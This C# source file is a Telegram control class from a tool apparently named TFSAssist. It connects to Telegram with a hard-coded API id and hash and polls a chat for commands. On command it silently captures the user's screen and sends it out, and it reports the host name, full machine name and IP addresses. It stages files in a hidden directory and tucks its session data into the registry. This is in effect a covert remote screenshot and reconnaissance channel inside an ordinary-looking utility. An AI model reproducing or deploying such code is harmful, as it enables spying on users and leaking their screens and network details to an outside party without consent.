using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using TeleSharp.TL;
using TFSAssist.Control;
using Utils;
using Utils.Handles;
using Utils.Telegram;
using Utils.UIControls.Tools;

namespace TFSAssist
{
    class TTLControl : TLControl
    {
        public TTLControl(int appiId, string apiHash) : base(appiId, apiHash)
        {

        }
    }

    public class TFSA_TLControl
    {
        public string TempDirectory { get; }
        private string ClientID = string.Empty;
        private Action<WarnSeverity, string> _log;
        private TTLControl _control;

        public TFSA_TLControl(string clientId, Action<WarnSeverity, string> log)
        {
            _log = log;
            ClientID = clientId;
            TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");
        }

        public async Task<bool> Initialize()
        {
            await GetTempSession();
            await CreateTempDirectory();

            try
            {
                _control = new TTLControl(770122, "8bf0b952100c9b22fd92499fc329c27e");
                await _control.ConnectAsync();

                await Task.Delay(5000);

                await _control.SendMessageAsync(_control.CurrentUser.Destination, $"Connected. {GetCurrentServerInfo()}", 0);

                return true;
            }
            catch (Exception ex)
            {
                _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
                return false;
            }
        }

        public async Task EndTransaction()
        {
            await _control.SendMessageAsync(_control.CurrentUser.Destination, $"Disconnected. {GetCurrentServerInfo()}", 0);
        }

        public async Task Run()
        {
            DateTime lastDate = DateTime.Now;
            while (true)
            {
                try
                {
                    List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
                    TLMessage lastMessage = newMessages?.LastOrDefault();
                    if (lastMessage != null)
                    {
                        await ReadCommands(newMessages);
                        lastDate = TLControl.ToDate(lastMessage.Date);
                    }
                }
                catch (Exception ex)
                {
                    _log?.Invoke(WarnSeverity.Debug, GetExMessage(ex));
                }

                await Task.Delay(5000);
            }
        }

        async Task ReadCommands(List<TLMessage> newMessages)
        {
            try
            {
                foreach (var tlMessage in newMessages)
                {
                    string isCommand = ClientID + ":";
                    if (tlMessage.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                    {
                        string message = tlMessage.Message.Substring(isCommand.Length, tlMessage.Message.Length - isCommand.Length);
                        switch (message)
                        {
                            case "screen":
                                string imagePath = Path.Combine(TempDirectory, $"{STRING.RandomString(15)}.jpg");
                                await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Jpeg);
                                await _control.SendPhotoAsync(_control.CurrentUser.Destination, imagePath);
                                //File.Delete(imagePath);
                                break;
                            case "info":
                                await _control.SendMessageAsync(_control.CurrentUser.Destination, GetCurrentServerInfo(true), 0);
                                break;
                        }
                    }
                    else if (tlMessage.Message.Like("info"))
                    {
                        await _control.SendMessageAsync(_control.CurrentUser.Destination, GetCurrentServerInfo(), 0);
                    }
                }
            }
            catch (Exception ex)
            {
                _log?.Invoke(WarnSeverity.Debug, GetExMessage(ex));
            }
            finally
            {
                // delete all data in temp
            }
        }

        string GetCurrentServerInfo(bool detailed = false)
        {
            try
            {
                var hostName = Dns.GetHostName();

                if (detailed)
                {
                    var serverName = System.Environment.MachineName;
                    var full = System.Net.Dns.GetHostEntry(serverName).HostName;
                    return $"CID=[{ClientID}] Host=[{hostName}] FullName=[{full}] Address=[\"{string.Join("\",\"", Dns.GetHostAddresses(hostName).ToList())}\"]";
                }

                return $"CID=[{ClientID}] Host=[{hostName}]";
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        async Task GetTempSession()
        {
            try
            {
                if (!File.Exists(TLControl.SessionName))
                    return;

                using (var stream = new FileStream(TLControl.SessionName, FileMode.Open))
                {
                    var buffer = new byte[2048];
                    await stream.ReadAsync(buffer, 0, 2048);
                    using (RegeditControl regedit = new RegeditControl(ASSEMBLY.ApplicationName))
                    {
                        regedit[TLControl.SessionName, RegistryValueKind.Binary] = buffer;
                    }
                }

                File.Delete(TLControl.SessionName);
            }
            catch (Exception ex)
            {
                _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
            }
        }

        async Task CreateTempDirectory()
        {
            if (Directory.Exists(TempDirectory))
            {
                try
                {
                    await IO.DeleteReadOnlyDirectoryAsync(TempDirectory);
                }
                catch (Exception ex)
                {
                    _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
                }
            }

            int tryes = 0;
            lableTrys:
            try
            {
                DirectoryInfo di = Directory.CreateDirectory(TempDirectory);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            catch (Exception ex)
            {
                _log?.Invoke(WarnSeverity.Error, GetExMessage(ex));
                tryes++;
                if (tryes < 5)
                    goto lableTrys;
            }
        }

        string GetExMessage(Exception ex)
        {
            return $"{nameof(TFSA_TLControl)} - {ex.Message}";
        }
    }
}
